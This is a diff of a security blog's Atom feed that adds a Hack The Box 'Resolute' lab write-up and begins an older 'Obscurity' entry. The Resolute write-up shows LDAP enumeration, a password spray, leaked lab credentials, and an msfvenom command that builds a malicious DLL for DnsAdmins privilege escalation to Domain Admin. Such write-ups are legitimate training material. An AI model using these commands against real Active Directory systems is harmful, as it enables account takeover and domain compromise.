@@ -1,4 +1,115 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="https://gr0sabi.github.io/feed.xml" rel="self" type="application/atom+xml" /><link href="https://gr0sabi.github.io/" rel="alternate" type="text/html" /><updated>2020-05-21T12:27:08-04:00</updated><id>https://gr0sabi.github.io/feed.xml</id><title type="html">gr0sabi@notes</title><subtitle>An information security and development blog. Various post related to the struggle against code and the hardware that pushes it around.</subtitle><author><name>John David Grow</name></author><entry><title type="html">Obscurity Write-Up: HackTheBox</title><link href="https://gr0sabi.github.io/hackthebox/obscurity-write-up-hackthebox/" rel="alternate" type="text/html" title="Obscurity Write-Up: HackTheBox" /><published>2020-05-09T00:00:00-04:00</published><updated>2020-05-09T00:00:00-04:00</updated><id>https://gr0sabi.github.io/hackthebox/obscurity-write-up-hackthebox</id><content type="html" xml:base="https://gr0sabi.github.io/hackthebox/obscurity-write-up-hackthebox/">&lt;p&gt;&lt;img src=&quot;\assets\images\htb\obscurity\banner-obscurity.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="https://gr0sabi.github.io/feed.xml" rel="self" type="application/atom+xml" /><link href="https://gr0sabi.github.io/" rel="alternate" type="text/html" /><updated>2020-05-30T13:28:21-04:00</updated><id>https://gr0sabi.github.io/feed.xml</id><title type="html">gr0sabi@notes</title><subtitle>An information security and development blog. Various post related to the struggle against code and the hardware that pushes it around.</subtitle><author><name>John David Grow</name></author><entry><title type="html">Resolute Write-Up: Hack The Box</title><link href="https://gr0sabi.github.io/hackthebox/resolute-write-up-hack-the-box/" rel="alternate" type="text/html" title="Resolute Write-Up: Hack The Box" /><published>2020-05-30T00:00:00-04:00</published><updated>2020-05-30T00:00:00-04:00</updated><id>https://gr0sabi.github.io/hackthebox/resolute-write-up-hack-the-box</id><content type="html" xml:base="https://gr0sabi.github.io/hackthebox/resolute-write-up-hack-the-box/">&lt;p&gt;&lt;img src=&quot;\assets\images\htb\resolute\resolute-banner.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h2 id=&quot;tldr&quot;&gt;TL;DR&lt;/h2&gt;
+&lt;p&gt;Resolute was a straight-forward &lt;em&gt;medium&lt;/em&gt;-rated machine on Hack The Box created by egre55. Initial recon revealed an open LDAP service which leaked all local users and a default password. This allowed a password spray against the users and a successful login as user &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;melanie&lt;/code&gt;. As &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;melanie&lt;/code&gt;, further machine enumeration revealed PowerShell transcripts that leaked a command containing user &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ryan&lt;/code&gt;’s password. User &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ryan&lt;/code&gt; is part of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Contractors&lt;/code&gt; group, which is also contained in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DnsAdmin&lt;/code&gt; group. Being a member of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DnsAdmin&lt;/code&gt; is abused to add first compromised user &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;melanie&lt;/code&gt; as a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Domain Admin&lt;/code&gt;, owning the machine.&lt;/p&gt;
+
+&lt;h2 id=&quot;nmap-port-scan&quot;&gt;Nmap Port Scan&lt;/h2&gt;
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap -sCV -Pn -n -p- -T4 -oN nmap/full-resolute 10.10.10.169&lt;/code&gt;&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-26 20:36 EDT
+Nmap scan report for 10.10.10.169
+Host is up (0.029s latency).                      
+Not shown: 65511 closed ports                     
+PORT      STATE SERVICE      VERSION              
+53/tcp    open  domain?                           
+| fingerprint-strings:                            
+|   DNSVersionBindReqTCP:                                                                                            
+|     version                                     
+|_    bind                                        
+88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2020-04-27 00:44:46Z)
+135/tcp   open  msrpc        Microsoft Windows RPC
+139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn                                                                                                                                                                                
+389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGABANK)
+464/tcp   open  kpasswd5?  
+593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0        
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped                                                                                           
+5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0                                                                          
+|_http-title: Not Found    
+9389/tcp  open  mc-nmf       .NET Message Framing
+47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+49664/tcp open  msrpc        Microsoft Windows RPC
+49665/tcp open  msrpc        Microsoft Windows RPC
+49666/tcp open  msrpc        Microsoft Windows RPC
+49667/tcp open  msrpc        Microsoft Windows RPC
+49671/tcp open  msrpc        Microsoft Windows RPC
+49676/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
+49677/tcp open  msrpc        Microsoft Windows RPC
+49688/tcp open  msrpc        Microsoft Windows RPC
+49712/tcp open  msrpc        Microsoft Windows RPC
+65424/tcp open  unknown
+
+Service Info: Host: RESOLUTE; OS: Windows; CPE: cpe:/o:microsoft:windows
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;ldap-enumeration&quot;&gt;LDAP Enumeration&lt;/h2&gt;
+
+&lt;p&gt;A default password is shown via the description for user &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;marko&lt;/code&gt;.&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Marko Novak, Employees, MegaBank Users, megabank.local                                                             
+dn: CN=Marko Novak,OU=Employees,OU=MegaBank Users,DC=megabank,DC=local
+objectClass: top
+objectClass: person
+objectClass: organizationalPerson
+objectClass: user 
+cn: Marko Novak                                           
+sn: Novak 
+description: Account created. Password set to Welcome123!
+[TRUNCATED]
+sAMAccountName: marko
+sAMAccountType: 805306368
+userPrincipalName: marko@megabank.local
+objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=megabank,DC=local                                            
+dSCorePropagationData: 20190927221048.0Z
+dSCorePropagationData: 20190927131714.0Z
+dSCorePropagationData: 16010101000001.0Z
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;I was unable to get any usage from the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Welcome123!&lt;/code&gt; password and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Marko&lt;/code&gt;, so I created a username list and used Metasploit’s WinRM Login module to test the password against the remainder of the accounts.&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ldapsearch -h 10.10.10.169 -x -b &quot;DC=megabank,DC=local&quot; '(objectClass=Person)' | grep userPrincipalName | cut -d &quot; &quot; -f 2 | cut -d &quot;@&quot; -f 1 &amp;gt; users.txt&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;We got a hit on user &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;melanie&lt;/code&gt;.
+&lt;img src=&quot;\assets\images\htb\resolute\resolute-winrm-scan.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;machine-compromise&quot;&gt;Machine Compromise&lt;/h2&gt;
+
+&lt;p&gt;I used evil-WinRM to get a shell and grabbed the user flag.
+&lt;img src=&quot;\assets\images\htb\resolute\resolute-melanie-login.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Looking at the root directory, we see an interesting folder that is hidden. This leads to an file that leaks the user Ryan’s password.&lt;/p&gt;
+
+&lt;p&gt;&lt;em&gt;File Location:&lt;/em&gt;
+&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;C:\PStranscripts\20191203\PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;em&gt;Line Containing Password Leak:&lt;/em&gt;&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;gt;&amp;gt; ParameterBinding(Invoke-Expression): name=&quot;Command&quot;; value=&quot;cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;pivoting-to-dns-admin&quot;&gt;Pivoting to DNS Admin&lt;/h2&gt;
+
+&lt;p&gt;Using Evil-WinRM I logged in with Ryan and noticed he was part of a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Contractors&lt;/code&gt; group. I love Bloodhound, so I used this opportunity to run it to enumerate everything that’s going on in the AD structure.&lt;/p&gt;
+
+&lt;p&gt;Ryan was a member of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Contractors&lt;/code&gt; group, but what is interesting is that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Contractors&lt;/code&gt; are a member of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DnsAdmins&lt;/code&gt; group. Privileges!
+&lt;img src=&quot;\assets\images\htb\resolute\resolute-bloodhound.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;After some research, I followed these blog posts that outline a privilege escalation via a feature abuse in AD where a user who is member of the DNSAdmins group or have write privileges to a DNS server object can load an arbitrary DLL with SYSTEM privileges on the DNS server:
+&lt;a href=&quot;https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html&quot; target=&quot;_blank&quot;&gt;Abusing DNSAdmins privilege for escalation in Active Directory&lt;/a&gt;&lt;br /&gt;
+&lt;a href=&quot;https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise&quot; target=&quot;_blank&quot;&gt;From DnsAdmins to SYSTEM to Domain Compromise&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;In accordance with the blog post, I created a malicous DLL that will add Melanie to the Domain Admins group:&lt;br /&gt;
+&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;msfvenom -a x64 -p windows/x64/exec cmd='net group &quot;domain admins&quot; melanie /add /domain' -f dll -o mel.dll&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;\assets\images\htb\resolute\resolute-dnscmd-entry.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;domain-admin-escalation&quot;&gt;Domain Admin Escalation&lt;/h2&gt;
+
+&lt;p&gt;Now we  can log in with Melanie and grab the root flag:
+&lt;img src=&quot;\assets\images\htb\resolute\resolute-root.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Thanks for reading!&lt;/p&gt;</content><author><name>John David Grow</name></author><category term="hackthebox" /><category term="ldap" /><category term="hacking" /><category term="penetration testing" /><category term="write-ups" /><summary type="html">Resolute was a straight-forward *medium*-rated machine on Hack The Box created by egre55. Initial recon revealed an open LDAP service which leaked all local users and a default password. This allowed a password spray against the users and a successful login as user `melanie`. As `melanie`, further machine enumeration revealed PowerShell transcripts that leaked a command containing user `ryan`'s password. User `ryan` is part of the `Contractors` group, which is also contained in the `DnsAdmin` group. Being a member of the `DnsAdmin` is abused to add first compromised user `melanie` as a `Domain Admin`, owning the machine.</summary></entry><entry><title type="html">Obscurity Write-Up: HackTheBox</title><link href="https://gr0sabi.github.io/hackthebox/obscurity-write-up-hackthebox/" rel="alternate" type="text/html" title="Obscurity Write-Up: HackTheBox" /><published>2020-05-09T00:00:00-04:00</published><updated>2020-05-09T00:00:00-04:00</updated><id>https://gr0sabi.github.io/hackthebox/obscurity-write-up-hackthebox</id><content type="html" xml:base="https://gr0sabi.github.io/hackthebox/obscurity-write-up-hackthebox/">&lt;p&gt;&lt;img src=&quot;\assets\images\htb\obscurity\banner-obscurity.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 &lt;h2 id=&quot;tldr&quot;&gt;TL;DR&lt;/h2&gt;
 &lt;p&gt;Obscurity was a fantastic machine of medium difficulty by clubby789 at HackTheBox. Rolling a few custom Python scripts for a web service, encryption, and SSH, Obscurity gave a couple of holes that I could squeeze through. With only a couple of open ports, it led me straight to enumerating the web application on port 8080. Examining the text on the main page it (surprisingly) leaked the file name of the webserver and allowed us to view the file with some directory traversal. Looking at the python file, it called a dangerous python exec() function which allowed us to obtain RCE via code injection. After getting a shell on the machine, we decrypt the user Robert’s Key and Password by reversing it with a script we create. These creds allow us SSH access as Robert, which gives us sudo permission to use an “unique” SSH script. With some simple bash magic, we can grab Root’s password hash and crack it with John.&lt;/p&gt;
 
